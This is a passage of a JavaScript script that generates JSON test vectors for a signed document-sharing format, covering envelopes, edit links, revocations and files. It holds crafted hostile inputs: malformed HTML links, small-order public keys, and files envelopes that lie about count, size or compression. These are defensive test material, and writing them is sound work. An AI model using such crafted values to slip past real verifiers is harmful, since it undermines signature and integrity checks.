  html: `<figure class="code"><figcaption>Rina</figcaption><pre><code class="language-widget">${WIDGET_CODE.replaceAll("<", "&lt;").replaceAll(">", "&gt;")}</code></pre></figure>`,
  body: `\`\`\`widget\n${WIDGET_CODE}\n\`\`\`\n`,
};

const said = {
  link_key: b64(LINK_KEY),
  identity: { root: b64(root.public), fingerprint: fingerprintOf(root.public) },
  references: { html: `<a HREF='tisty:page/1'>a</a><img alt=a src=tisty:picture/0 width=1 height=1><q cite=" tisty:file/2 ">b</q><a title/href="tisty:cited/3">c</a><a href="https://a.example/tisty:page/9">tisty:page/8</a>`, said: [{ kind: "page", at: 1 }, { kind: "picture", at: 0 }, { kind: "file", at: 2 }, { kind: "cited", at: 3 }] },
  refused,
  opening,
  a_newer_major: aNewerMajor.bytes.toString("hex"),
  newer_than_this: newer,
  before_the_first_shared: { id: EDITED, envelope: asHex(beforeTheFirstShared) },
  newer_files: { document: { id: HOSTILE, html: "<p>a</p>", body: "a", files: [aFile], files_hash: moreUnderALaterMinor.hash }, files: asHex(moreUnderALaterMinor) },
  small_order: [
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIA",
    "AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIA",
    "JuiVj8KyJ7BFw_SJ8u-Y8NXfrAXTxjM5sTgCiG1T_AU",
    "JuiVj8KyJ7BFw_SJ8u-Y8NXfrAXTxjM5sTgCiG1T_IU",
    "xxdqcD1N2E-6PAt2DRBnDyogU_osOczGTsf9d5KsA3o",
    "xxdqcD1N2E-6PAt2DRBnDyogU_osOczGTsf9d5KsA_o",
    "7P_______________________________________38",
    "7P________________________________________8",
    "7f_______________________________________38",
    "7f________________________________________8",
    "7v_______________________________________38",
    "7v________________________________________8",
  ],
  past_its_end: pastItsEnd.bytes.toString("hex"),
  signed_by: { root: b64(root.public), machine: b64(machine.public) },
  editing: {
    id: EDITED,
    owner: b64(root.public),
    token: b64(TOKEN),
    link: `https://tisty.cl/${EDITED}#${b64(LINK_KEY)}.${b64(TOKEN)}`,
    opens: opensForEditing.map(({ says, signer, envelope }) => ({ says, signer, envelope: asHex(envelope) })),
    refused: refusedForEditing.map(([says, envelope, whoChecks]) => ({ says, envelope: asHex(envelope), ...(whoChecks ? { without_the_key: true } : {}) })),
    rest_left_aside: asHex(restSaysAName),
    owner_revoked: { envelope: asHex(anas), served: { received: AFTER, revocations: [await revocation(root, machine, AT)] }, verdict: "doubtful" },
  },
  verdicts,
  files_refused: [
    { says: "another files envelope than the one it answers for", main: { id: "k7Qm2xPa" }, files: otherFiles.bytes.toString("hex") },
  ],
  files_lying: [
    { says: "more files than it says", document: countedOver, files: moreFiles.bytes.toString("hex") },
    { says: "a file that says it is compressed", document: squeezedOver, files: compressedFile.bytes.toString("hex") },
    { says: "a file at another place than it says", document: { id: HOSTILE, html: "<p>a</p>", body: "a", files: [{ ...aFile, at: 3 }], files_hash: inOtherPlace.hash }, files: inOtherPlace.bytes.toString("hex") },
    { says: "a file of another size than it says", document: { id: HOSTILE, html: "<p>a</p>", body: "a", files: [{ ...aFile, size: 1 }], files_hash: inOtherPlace.hash }, files: inOtherPlace.bytes.toString("hex") },
  ],
  pictures,
  playing,
  first_bytes: firstBytes,
  hostile_widget: hostileWidget,
  revocation: revoked,
  main: { envelope: main.bytes.toString("hex"), document: whole, pictures: PICTURES.map((one) => one.toString("hex")) },
  files: { envelope: files.bytes.toString("hex"), files: FILES.map((one) => Buffer.from(one).toString("hex")) },
  public: { envelope: open.bytes.toString("hex"), document: plain },
};
// What a published version wrote stays here as it was, so a later minor that stops opening it fails right away.
said.frozen = {
  ...frozenBefore,
  [CONTRACT]: {
    link_key: said.link_key,
    main: { envelope: said.main.envelope, document: whole },
    files: { envelope: said.files.envelope },
    public: { envelope: said.public.envelope, document: plain },
    playing: { ...playing, is: playing.is.filter(({ may_join_later }) => !may_join_later) },
  },
};
writeFileSync(WRITTEN, `${JSON.stringify(said, null, 2)}\n`);
